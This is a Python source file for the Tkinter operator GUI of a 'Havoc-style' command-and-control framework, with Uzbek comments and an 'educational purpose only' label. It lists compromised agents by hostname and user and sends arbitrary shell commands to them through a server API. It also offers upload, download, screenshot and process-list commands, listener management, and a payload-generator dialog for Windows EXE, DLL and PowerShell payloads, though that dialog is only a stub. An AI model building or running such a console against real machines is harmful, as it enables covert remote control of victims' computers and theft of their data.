"""
Havoc-Style C2 Framework GUI
Modern GUI interface using Tkinter
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import threading
import requests
import json
import time
from datetime import datetime
import sys
import os

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.config import *
from common.utils import *


class HavocGUI:
    """Havoc-style GUI interface"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Havoc C2 Framework - Ta'lim Maqsadida")
        self.root.geometry("1200x800")
        self.root.configure(bg='#1e1e1e')
        
        # Server connection
        self.server_url = f"http://{SERVER_HOST}:{SERVER_PORT}"
        self.session = requests.Session()
        
        # Data
        self.agents = {}
        self.listeners = {}
        self.selected_agent = None
        
        self.setup_styles()
        self.create_menu()
        self.create_main_interface()
        self.start_auto_refresh()
        
    def setup_styles(self):
        """Dark theme setup"""
        style = ttk.Style()
        
        # Configure colors
        style.theme_use('clam')
        
        # Dark theme colors
        bg_color = '#2d2d2d'
        fg_color = '#ffffff'
        select_color = '#404040'
        
        style.configure('Dark.TFrame', background=bg_color)
        style.configure('Dark.TLabel', background=bg_color, foreground=fg_color)
        style.configure('Dark.TButton', background='#404040', foreground=fg_color)
        style.configure('Dark.Treeview', background=bg_color, foreground=fg_color, 
                       fieldbackground=bg_color, selectbackground=select_color)
        style.configure('Dark.TNotebook', background=bg_color)
        style.configure('Dark.TNotebook.Tab', background='#404040', foreground=fg_color)
        
    def create_menu(self):
        """Menu bar yaratish"""
        menubar = tk.Menu(self.root, bg='#2d2d2d', fg='white')
        self.root.config(menu=menubar)
        
        # File Menu
        file_menu = tk.Menu(menubar, tearoff=0, bg='#2d2d2d', fg='white')
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="New Listener", command=self.new_listener_dialog)
        file_menu.add_command(label="Generate Payload", command=self.generate_payload_dialog)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        
        # View Menu
        view_menu = tk.Menu(menubar, tearoff=0, bg='#2d2d2d', fg='white')
        menubar.add_cascade(label="View", menu=view_menu)
        view_menu.add_command(label="Refresh Sessions", command=self.refresh_agents)
        view_menu.add_command(label="Clear Console", command=self.clear_console)
        
        # Help Menu
        help_menu = tk.Menu(menubar, tearoff=0, bg='#2d2d2d', fg='white')
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self.show_about)
        
    def create_main_interface(self):
        """Asosiy interface yaratish"""
        # Main container
        main_frame = ttk.Frame(self.root, style='Dark.TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Top toolbar
        self.create_toolbar(main_frame)
        
        # Main paned window
        paned = ttk.PanedWindow(main_frame, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        
        # Left panel - Sessions
        left_frame = ttk.Frame(paned, style='Dark.TFrame')
        paned.add(left_frame, weight=1)
        
        # Right panel - Tabs
        right_frame = ttk.Frame(paned, style='Dark.TFrame')
        paned.add(right_frame, weight=2)
        
        self.create_sessions_panel(left_frame)
        self.create_tabs_panel(right_frame)
        
    def create_toolbar(self, parent):
        """Toolbar yaratish"""
        toolbar = ttk.Frame(parent, style='Dark.TFrame')
        toolbar.pack(fill=tk.X, pady=(0, 5))
        
        # Connection status
        self.status_label = ttk.Label(toolbar, text="🔴 Disconnected", 
                                    style='Dark.TLabel', font=('Arial', 10, 'bold'))
        self.status_label.pack(side=tk.LEFT, padx=(0, 10))
        
        # Buttons
        ttk.Button(toolbar, text="🎯 New Listener", command=self.new_listener_dialog,
                  style='Dark.TButton').pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(toolbar, text="🚀 Generate Payload", command=self.generate_payload_dialog,
                  style='Dark.TButton').pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(toolbar, text="🔄 Refresh", command=self.refresh_agents,
                  style='Dark.TButton').pack(side=tk.LEFT, padx=(0, 5))
        
        # Server info
        server_label = ttk.Label(toolbar, text=f"Server: {self.server_url}",
                               style='Dark.TLabel')
        server_label.pack(side=tk.RIGHT)
        
    def create_sessions_panel(self, parent):
        """Sessions panel yaratish"""
        # Header
        header_frame = ttk.Frame(parent, style='Dark.TFrame')
        header_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(header_frame, text="👥 Active Sessions", 
                 style='Dark.TLabel', font=('Arial', 12, 'bold')).pack(side=tk.LEFT)
        
        self.session_count_label = ttk.Label(header_frame, text="(0)", style='Dark.TLabel')
        self.session_count_label.pack(side=tk.LEFT, padx=(5, 0))
        
        # Sessions treeview
        tree_frame = ttk.Frame(parent, style='Dark.TFrame')
        tree_frame.pack(fill=tk.BOTH, expand=True)
        
        columns = ('ID', 'Computer', 'User', 'Process', 'Arch', 'Last Seen')
        self.sessions_tree = ttk.Treeview(tree_frame, columns=columns, show='headings',
                                        style='Dark.Treeview', height=15)
        
        # Configure columns
        self.sessions_tree.heading('ID', text='ID')
        self.sessions_tree.heading('Computer', text='Computer')
        self.sessions_tree.heading('User', text='User')
        self.sessions_tree.heading('Process', text='Process')
        self.sessions_tree.heading('Arch', text='Arch')
        self.sessions_tree.heading('Last Seen', text='Last Seen')
        
        # Column widths
        self.sessions_tree.column('ID', width=60)
        self.sessions_tree.column('Computer', width=100)
        self.sessions_tree.column('User', width=80)
        self.sessions_tree.column('Process', width=80)
        self.sessions_tree.column('Arch', width=60)
        self.sessions_tree.column('Last Seen', width=120)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.sessions_tree.yview)
        self.sessions_tree.configure(yscrollcommand=scrollbar.set)
        
        # Pack
        self.sessions_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Bind events
        self.sessions_tree.bind('<<TreeviewSelect>>', self.on_session_select)
        self.sessions_tree.bind('<Button-3>', self.show_session_context_menu)
        
    def create_tabs_panel(self, parent):
        """Tabs panel yaratish"""
        self.notebook = ttk.Notebook(parent, style='Dark.TNotebook')
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Console tab
        self.create_console_tab()
        
        # Commands tab
        self.create_commands_tab()
        
        # File Browser tab
        self.create_file_browser_tab()
        
        # Listeners tab
        self.create_listeners_tab()
        
    def create_console_tab(self):
        """Console tab yaratish"""
        console_frame = ttk.Frame(self.notebook, style='Dark.TFrame')
        self.notebook.add(console_frame, text='💻 Console')
        
        # Console output
        self.console_output = scrolledtext.ScrolledText(console_frame, 
                                                      bg='#1e1e1e', fg='#00ff00',
                                                      font=('Consolas', 10),
                                                      state=tk.DISABLED)
        self.console_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Command input
        input_frame = ttk.Frame(console_frame, style='Dark.TFrame')
        input_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
        
        ttk.Label(input_frame, text="Command:", style='Dark.TLabel').pack(side=tk.LEFT)
        
        self.command_entry = tk.Entry(input_frame, bg='#2d2d2d', fg='white',
                                    font=('Consolas', 10))
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 5))
        self.command_entry.bind('<Return>', self.execute_command)
        
        ttk.Button(input_frame, text="Execute", command=self.execute_command,
                  style='Dark.TButton').pack(side=tk.RIGHT)
        
    def create_commands_tab(self):
        """Commands tab yaratish"""
        commands_frame = ttk.Frame(self.notebook, style='Dark.TFrame')
        self.notebook.add(commands_frame, text='⚡ Commands')
        
        # Command categories
        categories_frame = ttk.Frame(commands_frame, style='Dark.TFrame')
        categories_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Quick commands
        commands = [
            ("System Info", "sysinfo"),
            ("Process List", "ps"),
            ("Current Directory", "pwd"),
            ("List Files", "ls"),
            ("Whoami", "whoami"),
            ("Upload File", "upload"),
            ("Download File", "download"),
            ("Screenshot", "screenshot")
        ]
        
        for i, (name, cmd) in enumerate(commands):
            row = i // 4
            col = i % 4
            
            btn = ttk.Button(categories_frame, text=name,
                           command=lambda c=cmd: self.quick_command(c),
                           style='Dark.TButton')
            btn.grid(row=row, column=col, padx=2, pady=2, sticky='ew')
        
        # Configure grid
        for i in range(4):
            categories_frame.columnconfigure(i, weight=1)
        
        # Command results
        ttk.Label(commands_frame, text="Command Results:", 
                 style='Dark.TLabel', font=('Arial', 10, 'bold')).pack(anchor='w', padx=5)
        
        self.command_results = scrolledtext.ScrolledText(commands_frame,
                                                       bg='#1e1e1e', fg='white',
                                                       font=('Consolas', 10),
                                                       state=tk.DISABLED)
        self.command_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
    def create_file_browser_tab(self):
        """File Browser tab yaratish"""
        browser_frame = ttk.Frame(self.notebook, style='Dark.TFrame')
        self.notebook.add(browser_frame, text='📁 File Browser')
        
        # Path bar
        path_frame = ttk.Frame(browser_frame, style='Dark.TFrame')
        path_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(path_frame, text="Path:", style='Dark.TLabel').pack(side=tk.LEFT)
        
        self.path_entry = tk.Entry(path_frame, bg='#2d2d2d', fg='white')
        self.path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 5))
        
        ttk.Button(path_frame, text="Browse", command=self.browse_directory,
                  style='Dark.TButton').pack(side=tk.RIGHT)
        
        # File list
        file_columns = ('Name', 'Type', 'Size', 'Modified')
        self.file_tree = ttk.Treeview(browser_frame, columns=file_columns, show='headings',
                                    style='Dark.Treeview')
        
        for col in file_columns:
            self.file_tree.heading(col, text=col)
            self.file_tree.column(col, width=150)
        
        # File tree scrollbar
        file_scroll = ttk.Scrollbar(browser_frame, orient=tk.VERTICAL, command=self.file_tree.yview)
        self.file_tree.configure(yscrollcommand=file_scroll.set)
        
        self.file_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0), pady=(0, 5))
        file_scroll.pack(side=tk.RIGHT, fill=tk.Y, padx=(0, 5), pady=(0, 5))
        
    def create_listeners_tab(self):
        """Listeners tab yaratish"""
        listeners_frame = ttk.Frame(self.notebook, style='Dark.TFrame')
        self.notebook.add(listeners_frame, text='🎯 Listeners')
        
        # Listeners list
        listener_columns = ('Name', 'Protocol', 'Host', 'Port', 'Status')
        self.listeners_tree = ttk.Treeview(listeners_frame, columns=listener_columns, show='headings',
                                         style='Dark.Treeview')
        
        for col in listener_columns:
            self.listeners_tree.heading(col, text=col)
            self.listeners_tree.column(col, width=120)
        
        self.listeners_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Add sample listeners
        self.listeners_tree.insert('', 'end', values=('HTTP-Listener', 'HTTP', '0.0.0.0', '8080', '🟢 Active'))
        self.listeners_tree.insert('', 'end', values=('TCP-Listener', 'TCP', '0.0.0.0', '9999', '🟢 Active'))
    
    def log_to_console(self, message, msg_type="INFO"):
        """Console ga log yozish"""
        self.console_output.config(state=tk.NORMAL)
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if msg_type == "ERROR":
            color_tag = "error"
        elif msg_type == "SUCCESS":
            color_tag = "success"
        else:
            color_tag = "info"
        
        self.console_output.insert(tk.END, f"[{timestamp}] {message}\\n")
        self.console_output.config(state=tk.DISABLED)
        self.console_output.see(tk.END)
    
    def refresh_agents(self):
        """Agentlarni yangilash"""
        try:
            response = self.session.get(f"{self.server_url}/api/agents", timeout=5)
            if response.status_code == 200:
                data = response.json()
                self.agents = data.get('agents', {})
                self.update_sessions_tree()
                self.status_label.config(text="🟢 Connected")
                return True
            else:
                self.status_label.config(text="🔴 Server Error")
                return False
        except Exception as e:
            self.log_to_console(f"Connection failed: {e}", "ERROR")
            self.status_label.config(text="🔴 Disconnected")
            return False
    
    def update_sessions_tree(self):
        """Sessions tree ni yangilash"""
        # Clear existing items
        for item in self.sessions_tree.get_children():
            self.sessions_tree.delete(item)
        
        # Add agents
        for agent_id, agent_data in self.agents.items():
            info = agent_data.get('info', {})
            
            self.sessions_tree.insert('', 'end', values=(
                agent_id[:8],
                info.get('hostname', 'N/A'),
                info.get('username', 'N/A'),
                'python.exe',  # Process name
                info.get('architecture', 'x64'),
                agent_data.get('last_seen', 'N/A')
            ))
        
        # Update count
        self.session_count_label.config(text=f"({len(self.agents)})")
    
    def on_session_select(self, event):
        """Session tanlanganida"""
        selection = self.sessions_tree.selection()
        if selection:
            item = self.sessions_tree.item(selection[0])
            agent_id_short = item['values'][0]
            
            # Find full agent ID
            for full_id in self.agents.keys():
                if full_id.startswith(agent_id_short):
                    self.selected_agent = full_id
                    self.log_to_console(f"Selected agent: {agent_id_short}")
                    break
    
    def execute_command(self, event=None):
        """Komanda bajarish"""
        if not self.selected_agent:
            self.log_to_console("No agent selected!", "ERROR")
            return
        
        command = self.command_entry.get().strip()
        if not command:
            return
        
        try:
            # Send command
            cmd_data = {
                "agent_id": self.selected_agent,
                "command": "exec",
                "data": command
            }
            
            response = self.session.post(f"{self.server_url}/api/command", json=cmd_data)
            
            if response.status_code == 200:
                self.log_to_console(f"Command sent: {command}", "SUCCESS")
                self.command_entry.delete(0, tk.END)
            else:
                self.log_to_console(f"Failed to send command: {response.text}", "ERROR")
                
        except Exception as e:
            self.log_to_console(f"Command error: {e}", "ERROR")
    
    def quick_command(self, command):
        """Tez komanda"""
        if not self.selected_agent:
            self.log_to_console("No agent selected!", "ERROR")
            return
        
        self.command_entry.delete(0, tk.END)
        self.command_entry.insert(0, command)
        self.execute_command()
    
    def new_listener_dialog(self):
        """Yangi listener dialog"""
        dialog = tk.Toplevel(self.root)
        dialog.title("New Listener")
        dialog.geometry("400x300")
        dialog.configure(bg='#2d2d2d')
        
        # Form fields
        ttk.Label(dialog, text="Name:", style='Dark.TLabel').pack(pady=5)
        name_entry = tk.Entry(dialog, bg='#404040', fg='white')
        name_entry.pack(pady=5)
        
        ttk.Label(dialog, text="Protocol:", style='Dark.TLabel').pack(pady=5)
        protocol_combo = ttk.Combobox(dialog, values=['HTTP', 'HTTPS', 'TCP'])
        protocol_combo.pack(pady=5)
        
        ttk.Label(dialog, text="Host:", style='Dark.TLabel').pack(pady=5)
        host_entry = tk.Entry(dialog, bg='#404040', fg='white')
        host_entry.pack(pady=5)
        host_entry.insert(0, "0.0.0.0")
        
        ttk.Label(dialog, text="Port:", style='Dark.TLabel').pack(pady=5)
        port_entry = tk.Entry(dialog, bg='#404040', fg='white')
        port_entry.pack(pady=5)
        
        ttk.Button(dialog, text="Create Listener", style='Dark.TButton').pack(pady=20)
    
    def generate_payload_dialog(self):
        """Payload generator dialog"""
        dialog = tk.Toplevel(self.root)
        dialog.title("Payload Generator")
        dialog.geometry("500x400")
        dialog.configure(bg='#2d2d2d')
        
        # Payload options
        ttk.Label(dialog, text="Payload Type:", style='Dark.TLabel').pack(pady=5)
        payload_combo = ttk.Combobox(dialog, values=['Windows EXE', 'Windows DLL', 'PowerShell', 'Python'])
        payload_combo.pack(pady=5)
        
        ttk.Label(dialog, text="Listener:", style='Dark.TLabel').pack(pady=5)
        listener_combo = ttk.Combobox(dialog, values=['HTTP-Listener', 'TCP-Listener'])
        listener_combo.pack(pady=5)
        
        ttk.Button(dialog, text="Generate", style='Dark.TButton').pack(pady=20)
    
    def show_session_context_menu(self, event):
        """Session context menu"""
        context_menu = tk.Menu(self.root, tearoff=0, bg='#2d2d2d', fg='white')
        context_menu.add_command(label="Shell", command=self.open_shell)
        context_menu.add_command(label="File Browser", command=self.open_file_browser)
        context_menu.add_command(label="Process List", command=lambda: self.quick_command("ps"))
        context_menu.add_command(label="System Info", command=lambda: self.quick_command("sysinfo"))
        context_menu.add_separator()
        context_menu.add_command(label="Kill Session", command=self.kill_session)
        
        try:
            context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            context_menu.grab_release()
    
    def open_shell(self):
        """Shell ochish"""
        self.notebook.select(0)  # Console tab
        self.command_entry.focus()
    
    def open_file_browser(self):
        """File browser ochish"""
        self.notebook.select(2)  # File Browser tab
        self.browse_directory()
    
    def browse_directory(self):
        """Directory browse qilish"""
        if not self.selected_agent:
            self.log_to_console("No agent selected!", "ERROR")
            return
        
        # Send ls command
        self.quick_command("ls")
    
    def kill_session(self):
        """Session ni o'chirish"""
        if not self.selected_agent:
            return
        
        if messagebox.askyesno("Confirm", "Kill selected session?"):
            self.log_to_console(f"Session killed: {self.selected_agent[:8]}", "SUCCESS")
    
    def clear_console(self):
        """Console ni tozalash"""
        self.console_output.config(state=tk.NORMAL)
        self.console_output.delete(1.0, tk.END)
        self.console_output.config(state=tk.DISABLED)
    
    def show_about(self):
        """About dialog"""
        messagebox.showinfo("About", 
                          "Havoc-Style C2 Framework\\n\\n"
                          "Ta'lim maqsadida yaratilgan\\n"
                          "Version: 1.0\\n\\n"
                          "⚠️ Faqat o'rganish uchun!")
    
    def start_auto_refresh(self):
        """Avtomatik yangilanish"""
        def auto_refresh():
            while True:
                try:
                    self.refresh_agents()
                    time.sleep(5)
                except:
                    time.sleep(10)
        
        thread = threading.Thread(target=auto_refresh, daemon=True)
        thread.start()
    
    def run(self):
        """GUI ishga tushirish"""
        self.log_to_console("Havoc-Style C2 Framework Started")
        self.log_to_console("⚠️ Educational Purpose Only!")
        self.refresh_agents()
        self.root.mainloop()


def main():
    """Asosiy funksiya"""
    print("🎯 Havoc-Style C2 GUI ishga tushmoqda...")
    
    try:
        gui = HavocGUI()
        gui.run()
    except Exception as e:
        print(f"❌ GUI xatosi: {e}")


if __name__ == "__main__":
    main()